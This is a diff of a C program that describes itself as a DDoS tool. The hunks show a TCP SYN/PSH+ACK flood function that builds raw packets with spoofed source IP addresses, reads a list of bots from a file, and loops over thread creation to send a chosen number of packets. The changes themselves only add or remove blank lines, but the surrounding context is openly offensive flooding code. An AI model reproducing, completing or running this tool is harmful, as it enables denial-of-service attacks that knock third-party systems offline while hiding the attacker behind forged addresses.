@@ -26,8 +26,6 @@ struct tcp_psh {
  *  DDoS attack..
 */
 void tcp_syn_flood(char *dest_ip, int dest_port, char *spoof_ip, struct sockaddr_in *d_addr) {
-
-    
     char packet[4097], data[PACKT_SIZE];
     memset(packet, 0, sizeof(packet));
     struct iphdr *ip_header = (struct iphdr*)packet;
@@ -126,6 +124,7 @@ void tcp_syn_flood(char *dest_ip, int dest_port, char *spoof_ip, struct sockaddr
     counter++;
     close(sock);
 }
+
 void print_status(char *ip) {
     printf("%s[%sINFO%s]:%s Sending TCP PSH+ACK packet..Using spoofed source ip %s[%s%s%s]%s (%d/%d)\n", 
     whi, gre, whi, res, whi, pur, ip, whi, res, counter, packet_num);
@@ -148,7 +147,6 @@ void *syn_flood_thread(void *vargb) {
 }
 
 int main(int argc, char *argv[]) {
-
     srand(time(0));
     if(argc < 5) {
         printf("%s[%sCRITICAL%s]:%s Missing argument(s)...\n", whi, yel, whi, res);
@@ -159,7 +157,6 @@ int main(int argc, char *argv[]) {
     char *bots_file = argv[2];
     int port = atoi(argv[3]);
     packet_num = atoi(argv[4]);
-
         
     FILE *fp;
     char *tmp;
@@ -188,6 +185,7 @@ int main(int argc, char *argv[]) {
         whi, red, whi, res, host);
         exit(1);
     }
+
     struct tcp_psh *fld = (struct tcp_psh*) calloc(1, sizeof(struct tcp_psh));
     if(!fld) {
         fprintf(stderr, "%s[%sERROR%s]:%s Out of memory space!\n",
@@ -203,7 +201,6 @@ int main(int argc, char *argv[]) {
     //Create threads for this attack.
     
     while(k < packet_num) {
-
         pthread_create(&thread_id, NULL, syn_flood_thread, (void*)fld);
         pthread_join(thread_id, NULL);
         k++;
